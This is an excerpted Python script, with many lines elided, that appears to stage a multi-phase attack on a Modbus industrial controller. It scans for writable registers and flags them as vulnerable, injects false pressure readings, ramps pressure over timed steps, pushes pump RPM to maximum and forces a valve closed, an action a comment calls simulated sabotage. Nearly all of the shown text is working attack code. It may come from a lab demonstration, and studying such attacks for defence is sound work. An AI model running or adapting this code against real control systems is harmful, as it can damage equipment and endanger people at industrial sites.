...
def phase2_info_gathering(targets: dict):
    ...
    try:
        ...
        rr = client.read_holding_registers(REG_PRESSURE, count=4, slave=1)
        if not rr.isError():
        ...
        rr2 = client.read_holding_registers(REG_ACTUATOR_RPM, count=3, slave=1)
        if not rr2.isError():
...
def phase3_vuln_scan(targets: dict):
    ...
    if HAS_MODBUS:
        ...
        if client.connect():
            ...
            r = client.read_holding_registers(0, count=1, slave=1)
            ...
            r2 = client.read_holding_registers(REG_ACTUATOR_RPM, count=1, slave=1)
            safe_rpm = r2.registers[0] if not r2.isError() else 1200
            wr = client.write_register(REG_ACTUATOR_RPM, value=safe_rpm, slave=1)
            result("FC6 (Write Single Reg)",   "SUPPORTED — VULNERABLE!" if not wr.isError() else "DENIED")
            # FC16 — Write Multiple Registers
            wm = client.write_registers(REG_ACTUATOR_RPM, values=[safe_rpm], slave=1)
...
def phase4_exploit(targets: dict):
    ...
    try:
        # Read current before
        rr = client.read_holding_registers(REG_PRESSURE, count=1, slave=1)
        before = rr.registers[0] if not rr.isError() else "?"
        result("Pressure BEFORE inject", f"{before} PSI")

        # Inject
        inject_val = 350
        r = client.write_register(REG_PRESSURE, value=inject_val, slave=1)
        if r.isError():
        ...
        rr2 = client.read_holding_registers(REG_PRESSURE, count=1, slave=1)
...
def phase5_payload(targets: dict):
    ...
    try:
        ...
        for step in range(9):   # 9 steps × 5s = 45s total
            ...
            client.write_register(REG_PRESSURE, value=new_pressure, slave=1)
...
def phase6_lateral_movement(targets: dict):
    ...
    if HAS_MODBUS:
        ...
        if client.connect():
            r = client.read_holding_registers(REG_PRESSURE, count=4, slave=1)
            if not r.isError():
...
def phase7_privesc(targets: dict):
    ...
    try:
        ...
        rr = client.read_holding_registers(REG_ACTUATOR_RPM, count=3, slave=1)
        if not rr.isError():
        ...
        client.write_register(REG_ACTUATOR_RPM, value=3000, slave=1)
        result("Pump RPM written", "3000 RPM (max)")
        sleep_with_label(2)

        # Force valve closed
        warn("Closing valve (reg 202 = 0) → simulates sabotage")
        client.write_register(REG_VALVE_TOGGLE, value=0, slave=1)
        ...
        client.write_register(REG_ACTUATOR_RPM, value=orig_rpm, slave=1)
        client.write_register(REG_VALVE_TOGGLE, value=orig_toggle, slave=1)
